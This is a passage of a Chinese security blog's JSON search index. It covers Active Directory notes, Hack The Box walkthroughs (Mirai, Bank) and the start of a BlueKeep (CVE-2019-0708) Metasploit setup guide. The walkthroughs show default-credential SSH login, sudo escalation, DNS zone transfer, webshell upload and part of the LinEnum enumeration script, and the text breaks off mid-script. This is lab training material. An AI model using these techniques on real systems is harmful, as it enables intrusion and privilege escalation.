创建后不能直接应用在计算机、用户或用户组上，而是必须要链接到 AD 活动目录中的容器或 OU 上，或直接运用在整个域级别 GPO 默认会对域或 OU 下所有计算机/用户生效，如要对应用范围做进一步精确控制，可使用安全过滤(Security Filtering) 或 WMI筛选器(WMI Filtering) GPO 也可以对默认的应用范围设置个别的排除对象 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:19:0","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"组策略的生效时间 计算机启动时自动获取并生效「计算机配置」条目 用户登录时自动获取并生效「用户配置」条目 计算机已开机或用户已登录则默认需 90-120 分钟才会生效(90分钟加30分钟随机值，以避免并发高峰，该时间可配) 客户端可以通过命令 gpupdate/force 强制获取并刷新组策略 部分设置即使应用后也需要重启计算机或用户注销重新登录才能生效 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:20:0","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"客户端查看当前应用的 GPO： gpresult /h d:\\gporesult.html gpresult /r ##组策略的处理原则 继承原则 启用/禁用继承 累加性原则 优先原则 子OU \u003e 父OU \u003e 域 \u003e 站点 \u003e 本地策略 顺序原则 同一个 OU 中多条 GPO 按上下次序 其他原则 OU中只有计算机则只应用“计算机配置” OU中只有用户则只应用优先于“用户配置” OU中同时有计算机和用户则两类配置都启用(有冲突时计算机配置优先) ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:21:0","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"组策略的其它操作 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:22:0","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"组策略的备份与恢复 可以备份单条 GPO，也可以备份所有 GPO 每次备份会记录时间戳，因此可以基于保存多份历史版本做精确恢复 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:22:1","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"组策略的存储 域的信任关系 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:22:2","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"信任关系的概念 域是安全边界，如果域之间没有信任关系，每个域中的用户只能访问本域内的资源 信任关系在两个域之间架起了一座桥梁(信任路径)，使得域用户帐户可以跨域使用，实现了跨域的身份验证和资源访问 信任关系常用的场景包括公司并购、外部合作、活动目录迁徙等 根据域类型的不同，有些域之间的信任关系默认存在，有些则需要手工创建 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:23:0","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"信任关系的方向性 A 域单向信任 B 域 A 域中的资源可以被 B 域访问 A 域和 B 域双向信任 A 域中的资源可以被 B 域访问 B 域中的资源可以被 A 域访问 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:23:1","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"信任关系的传递性 信任关系如果是可传递的，则多个可传递的信任关系可以自动串接 信任关系如果是不可传递的，则信任链断裂，无法完成信任关系自动串接 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:23:2","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"林内的信任关系 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:23:3","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"林间的信任关系 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:23:4","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"快捷信任 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:23:5","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"信任关系总结 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:23:6","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"信任关系的配置 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:24:0","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"林内的信任关系 父子信任，树根信任均为默认存在，无需手工创建 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:24:1","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"林间的信任关系 森林信任或外部信任需手工创建，配置可以是单向或双向 本域需要 DNS 查询能够得到对方域控制器的 SRV 记录(条件转发或辅助区域同步) 「信任方」和「被信任方」两边分别配置信任的「内向」和「外向」 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:24:2","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"信任的安全增强 选择性身份认证 名称后缀路由 操作主机 FSMO ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:24:3","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"操作主机概述 域控制器之间需要同步 AD 的数据库 大部分的数据同步采用多主机复制机制 少部分的数据同步采用单主机复制机制 操作主机即用于这类特殊的单主机复制，以满足特殊场景下更高效可控的数据同步 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:25:0","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"操作主机的角色 默认第一台安装的域控制器承担了所有的角色 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:25:1","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"操作主机的作用 林级别 域级别 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:25:2","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"操作主机角色的查看 命令行方式 查询所有的 FSMO 角色 netdom query fsmo 图形化方式 站点及活动目录复制 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:25:3","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"站点的概念 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:26:0","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"域用户登录过程 PC 终端向 DNS 查询 DC 的 SRV 记录，获取域内所有 DC 的IP 根据 DNS 中配置的优先级和权重等因素，返回提供服务的 DC 域控制器的 IP 如果所有 DC 的优先级和权重相同，则返回所有的 DC 的IP，此时会导致 PC 终端所选择的 DC 控制器会具有一定的随机性 注： 可用 set loginserver 查看当前计算机由哪台 DC 服务 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:26:1","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"问题与挑战 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:26:2","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"站点-Site 站点由 IP 子网构成，站点内的节点可以相互高速通信 默认情况下所有的域控制器都在一个站点中(Default-first-site-name) 部署多个站点的目的是优化站点间 DC 的复制同步，同时使客户端能够和就近的 DC 优先通信，优化登录验证的操作 建议根据地理位置和互通带宽的实际情况，定义「域控制器」、「iP子网」、「站点」三者之间的关系 IP 终端在登录时会自动根据自身 IP 地址在 DNS 中寻找包含本 IP 子网的站点中的 DC 进行登录 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:26:3","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"站点内的数据复制 同一站点内多个 DC 之间的复制采用多主机复制模式(multimaster replication) KCC算法(Knowledge Consistency Checker)负责自动计算每台 DC 的复制路径，确保从更新的始发 DC 到最远端的 DC 之间的复制关系不超过 3 跳 当一台 DC 发生数据改变后，默认等待 15 秒后，通知「直接复制伙伴」来获取更新，直接复制伙伴在获取更新后，会以相同的方式通知自己的复制伙伴来获取更新，直到站点内所有的 DC 都获取到该更新 当更新数据很重要时(如用户账户锁定，密码变动，策略变动等)，不会等待 15 秒的延迟再发通知，而是用单主复制模式的「紧急通知」的方式，立即通知复制伙伴 即使没有数据更新，站点内 DC 也会每隔一定时间进行数据同步(默认 1 小时，可配置调整)，也可随时手工触发立即复制 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:27:0","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"过程 站点间 DC 的数据复制机制不会一有变化就立即触发通知，而是按指定频率定时复制(默认小时),且必须在复制计划允许的时间窗口内(比如下班以后);也可在必要时由管理员手工触发立即更新 每一个站点内都有一台 DC 作为站点间拓扑生成器(ISTG)，负责计算该站点和其他站点之间的最佳复制路径 ITSG 同时指定站点内的一台 DC 为桥头堡服务器(Bridgehead)，负责域间数据复制的出入口跳板。站点内的 DC 将复制更新统一交给 Bridgehead，由其负责和其他站点的 Bridgehead 通信复制站点间数据，再进一步复制给对方站点内的其他 DC。 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:27:1","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"站点链接 站点和站点之间复制的逻辑通道，建立站点链接需确保 DC 间的 IP 可达 设置站点链接的开销(Cost)将影响路径的选择，默认的开销为100，越小越优先 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:27:2","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"站点与组策略 部署站点后可以将组策略的应用范围配置为对站点内对象生效 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:27:3","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["内网渗透"],"content":"复制的监视和排错 ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:27:4","tags":["域安全","内网渗透"],"title":"AD 活动目录管理","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["靶场"],"content":"Hack The Box靶场练习记录","date":"2019-09-11","objectID":"/2019/09/hacktheboxmirai/","tags":["HTB靶场"],"title":"Hack The Box —— Mirai","uri":"/2019/09/hacktheboxmirai/"},{"categories":["靶场"],"content":"Hack The Box —— Mirai ","date":"2019-09-11","objectID":"/2019/09/hacktheboxmirai/:0:0","tags":["HTB靶场"],"title":"Hack The Box —— Mirai","uri":"/2019/09/hacktheboxmirai/"},{"categories":["靶场"],"content":"信息搜集 ","date":"2019-09-11","objectID":"/2019/09/hacktheboxmirai/:1:0","tags":["HTB靶场"],"title":"Hack The Box —— Mirai","uri":"/2019/09/hacktheboxmirai/"},{"categories":["靶场"],"content":"nmap nmap -T4 -A -v 10.10.10.48 得到： 服务器开放了 TCP 53、80、22端口。 访问 80 端口，为空白页面。 ","date":"2019-09-11","objectID":"/2019/09/hacktheboxmirai/:1:1","tags":["HTB靶场"],"title":"Hack The Box —— Mirai","uri":"/2019/09/hacktheboxmirai/"},{"categories":["靶场"],"content":"目录爆破 python3 dirsearch.py -u http://10.10.10.48/ -e html -t 20 得到： 发现 admin 目录。 访问，得到： 搜索相关信息，发现是一个树莓派上搭建的服务 ","date":"2019-09-11","objectID":"/2019/09/hacktheboxmirai/:1:2","tags":["HTB靶场"],"title":"Hack The Box —— Mirai","uri":"/2019/09/hacktheboxmirai/"},{"categories":["靶场"],"content":"漏洞利用 尝试使用树莓派默认密码登录，搜索相关信息，发现树莓派默认密码如下： 尝试登录： ssh pi@10.10.10.48 发现登录成功： 直接 cat /home/pi/user.txt 获得第一个 flag。 利用 sudo -l 命令，查看当前可执行 sudo 的权限： 发现无需密码可执行 root 的所有命令，直接 sudo su 切换到 root 用户。 直接 cat /root/root.txt 发现如下信息： 尝试查看当前系统挂载了哪些设备： df -lh 发现 /dev/sdb 设备挂载在 /media/stick 下： ","date":"2019-09-11","objectID":"/2019/09/hacktheboxmirai/:2:0","tags":["HTB靶场"],"title":"Hack The Box —— Mirai","uri":"/2019/09/hacktheboxmirai/"},{"categories":["靶场"],"content":"方法一 直接利用 strings 命令获取设备中的所有字符串： strings /dev/sdb 得到疑似 flag 的字符串，提交后发现正确。 ","date":"2019-09-11","objectID":"/2019/09/hacktheboxmirai/:2:1","tags":["HTB靶场"],"title":"Hack The Box —— Mirai","uri":"/2019/09/hacktheboxmirai/"},{"categories":["靶场"],"content":"方法二 使用 dd 命令提取 usb 镜像: dcfldd if=/dev/sdb of=/home/pi/usb.dd​ 然后，分析镜像内容： binwalk usb.dd​ 发现存在三个文件。使用 binwalk 提取文件： binwalk -Me usb.dd​ 查看原始文件，得到 flag ","date":"2019-09-11","objectID":"/2019/09/hacktheboxmirai/:2:2","tags":["HTB靶场"],"title":"Hack The Box —— Mirai","uri":"/2019/09/hacktheboxmirai/"},{"categories":["靶场"],"content":"Hack The Box靶场练习记录","date":"2019-09-09","objectID":"/2019/09/hacktheboxbank/","tags":["HTB靶场"],"title":"Hack The Box —— Bank","uri":"/2019/09/hacktheboxbank/"},{"categories":["靶场"],"content":"Hack The Box —— Bank ","date":"2019-09-09","objectID":"/2019/09/hacktheboxbank/:0:0","tags":["HTB靶场"],"title":"Hack The Box —— Bank","uri":"/2019/09/hacktheboxbank/"},{"categories":["靶场"],"content":"信息搜集 ","date":"2019-09-09","objectID":"/2019/09/hacktheboxbank/:1:0","tags":["HTB靶场"],"title":"Hack The Box —— Bank","uri":"/2019/09/hacktheboxbank/"},{"categories":["靶场"],"content":"nmap nmap -T4 -A -v 10.10.10.29 发现开放了22、80、TCP 53 端口，在 53 端口上开放 DNS 服务。通常情况下 DNS 服务开放在 UDP 53 端口上，在 TCP 上开放 DNS 服务，一般是具有区域传输功能，因此怀疑具有 DNS 区域传输漏洞。 访问 80 端口，是一个 apache 的默认页面，通常情况下，这种既开着 DNS 的，然后直接访问 80 端口为空页面的服务器，是作为虚拟主机使用。 ","date":"2019-09-09","objectID":"/2019/09/hacktheboxbank/:1:1","tags":["HTB靶场"],"title":"Hack The Box —— Bank","uri":"/2019/09/hacktheboxbank/"},{"categories":["靶场"],"content":"DNS 信息查询 首先测试 localhost 与 10.10.10.29，并未发现有价值的信息，然后尝试猜测 bank.htb （看了 WP 才知道），发现该域名能够被 DNS 服务所解析，因此利用 dig 工具进行进一步测试。 dig axfr bank.htb @10.10.10.29 成功利用区域传输漏洞获得 bank.htb 域名的子域名。 ","date":"2019-09-09","objectID":"/2019/09/hacktheboxbank/:1:2","tags":["HTB靶场"],"title":"Hack The Box —— Bank","uri":"/2019/09/hacktheboxbank/"},{"categories":["靶场"],"content":"漏洞发掘 将攻击机的 DNS 服务器设置为 10.10.10.29，然后访问 www.bank.htb，得到： 然后利用 dirsearch 工具进行目录爆破： 发现上传目录、index.php、support.php，但是index.php、support.php页面大小不同，却直接 302 重定向到login.php，怀疑index.php、support.php 另有玄机。 利用 burpsuite 的重写 response header 的功能，取消重定向，即将 302 改为 200。 访问得到index.php、support.php： support.php 存在上传点，但是经过尝试，并未绕过限制，进而进一步进行测试。 在目录爆破的过程中，发现了 balance-transfer 目录，访问后得到： 随便打开一个文件，发现里面疑似是加密过的日志，因此尝试寻找加密失败的文件，进而获得用户名和密码的明文。 首先将所有文件下载到本地： wget -r http://www.bank.htb/balance-transfer 然后进入到 balance-transfer 目录，删除index.html* 等文件，进行大小排序： wc -c *.acc | sort -n 发现一个特别小的文件，访问后得到： 利用得到的账号和密码登录： 再次发现上传页面，同时，该上传页面利用的是之前的 support.php。 右键查看当前页面的源代码，发现一处 debug 留下的漏洞： 直接上传webshell，命名为 xxx.htb，菜刀连接： 查看 user.txt 获得第一个 flag。 whoami 查看权限，发现权限不足，尝试提权。 上传 LinEnum.sh 脚本，并执行，获得一些辅助信息。 #!/bin/bash #A script to enumerate local information from a Linux host version=\"version 0.97\" #@rebootuser #help function usage () { echo -e \"\\n\\e[00;31m#########################################################\\e[00m\" echo -e \"\\e[00;31m#\\e[00m\" \"\\e[00;33mLocal Linux Enumeration \u0026 Privilege Escalation Script\\e[00m\" \"\\e[00;31m#\\e[00m\" echo -e \"\\e[00;31m#########################################################\\e[00m\" echo -e \"\\e[00;33m# www.rebootuser.com | @rebootuser \\e[00m\" echo -e \"\\e[00;33m# $version\\e[00m\\n\" echo -e \"\\e[00;33m# Example: ./LinEnum.sh -k keyword -r report -e /tmp/ -t \\e[00m\\n\" echo \"OPTIONS:\" echo \"-k Enter keyword\" echo \"-e Enter export location\" echo \"-s Supply user password for sudo checks (INSECURE)\" echo \"-t Include thorough (lengthy) tests\" echo \"-r Enter report name\" echo \"-h Displays this help text\" echo -e \"\\n\" echo \"Running with no options = limited scans/no output file\" echo -e \"\\e[00;31m#########################################################\\e[00m\" } header() { echo -e \"\\n\\e[00;31m#########################################################\\e[00m\" echo -e \"\\e[00;31m#\\e[00m\" \"\\e[00;33mLocal Linux Enumeration \u0026 Privilege Escalation Script\\e[00m\" \"\\e[00;31m#\\e[00m\" echo -e \"\\e[00;31m#########################################################\\e[00m\" echo -e \"\\e[00;33m# www.rebootuser.com\\e[00m\" echo -e \"\\e[00;33m# $version\\e[00m\\n\" } debug_info() { echo \"[-] Debug Info\" if [ \"$keyword\" ]; then echo \"[+] Searching for the keyword $keywordin conf, php, ini and log files\" fi if [ \"$report\" ]; then echo \"[+] Report name = $report\" fi if [ \"$export\" ]; then echo \"[+] Export location = $export\" fi if [ \"$thorough\" ]; then echo \"[+] Thorough tests = Enabled\" else echo -e \"\\e[00;33m[+] Thorough tests = Disabled\\e[00m\" fi sleep 2 if [ \"$export\" ]; then mkdir $export 2\u003e/dev/null format=$export/LinEnum-export-`date +\"%d-%m-%y\"` mkdir $format 2\u003e/dev/null fi if [ \"$sudopass\" ]; then echo -e \"\\e[00;35m[+] Please enter password - INSECURE - really only for CTF use!\\e[00m\" read -s userpassword echo fi who=`whoami` 2\u003e/dev/null echo -e \"\\n\" echo -e \"\\e[00;33mScan started at:\"; date echo -e \"\\e[00m\\n\" } # useful binaries (thanks to https://gtfobins.github.io/) binarylist='nmap\\|perl\\|awk\\|find\\|bash\\|sh\\|man\\|more\\|less\\|vi\\|emacs\\|vim\\|nc\\|netcat\\|python\\|ruby\\|lua\\|irb\\|tar\\|zip\\|gdb\\|pico\\|scp\\|git\\|rvim\\|script\\|ash\\|csh\\|curl\\|dash\\|ed\\|env\\|expect\\|ftp\\|sftp\\|node\\|php\\|rpm\\|rpmquery\\|socat\\|strace\\|taskset\\|tclsh\\|telnet\\|tftp\\|wget\\|wish\\|zsh\\|ssh$\\|ip$\\|arp\\|mtr' system_info() { echo -e \"\\e[00;33m### SYSTEM ##############################################\\e[00m\" #basic kernel info unameinfo=`uname -a 2\u003e/dev/null` if [ \"$unameinfo\" ]; then echo -e \"\\e[00;31m[-] Kernel information:\\e[00m\\n$unameinfo\" echo -e \"\\n\" fi procver=`cat /proc/version 2\u003e/dev/null` if [ \"$procver\" ]; then echo -e \"\\e[00;31m[-] Kernel information (continued):\\e[00m\\n$procver\" echo -e \"\\n\" fi #search all *-release files for version info release=`cat /etc/*-release 2\u003e/dev/null` if [ \"$release\" ]; then echo -e \"\\e[00;31m[-] Specific release information:\\e[00m\\n$release\" echo -e \"\\n\" fi #target hostname info hostnamed=`hostname 2\u003e/dev/null` if [ \"$hostnamed\" ]; then echo -e \"\\e[00;31m[-] Hostname:\\e[00m\\n$","date":"2019-09-09","objectID":"/2019/09/hacktheboxbank/:2:0","tags":["HTB靶场"],"title":"Hack The Box —— Bank","uri":"/2019/09/hacktheboxbank/"},{"categories":["漏洞复现"],"content":"CVE-2019-0708 远程桌面代码执行漏洞复现","date":"2019-09-07","objectID":"/2019/09/cve-2019-0708%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","tags":["RDP","漏洞复现"],"title":"CVE-2019-0708远程桌面代码执行漏洞复现","uri":"/2019/09/cve-2019-0708%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"CVE-2019-0708 远程桌面代码执行漏洞复现 ","date":"2019-09-07","objectID":"/2019/09/cve-2019-0708%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:0","tags":["RDP","漏洞复现"],"title":"CVE-2019-0708远程桌面代码执行漏洞复现","uri":"/2019/09/cve-2019-0708%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"漏洞环境 目标机 IP: 172.16.105.129 攻击机 IP：172.16.105.1 在 mac 下使用 VMware Fusion 安装 Windows7 SP1，下载链接如下： Windows7 SP1 下载链接: ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/ 注意： 由于目前 exp 只支持如下版本的系统，因此安装其它版本的系统可能无法利用。 打开 win7 的远程桌面功能： ","date":"2019-09-07","objectID":"/2019/09/cve-2019-0708%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:0","tags":["RDP","漏洞复现"],"title":"CVE-2019-0708远程桌面代码执行漏洞复现","uri":"/2019/09/cve-2019-0708%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"msf 环境准备 下载 https://github.com/rapid7/metasploit-framework/pull/12283/files 中的攻击套件放置文件到msf的相应文件夹(如果已存在同名文件,直接覆盖即可) rdp.rb -\u003e /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rb rdp_scanner.rb -\u003e /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb cve_2019_0708_bluekeep.rb -\u003e /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb cve_2019_0708_bluekeep_rce.rb -\u003e /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb 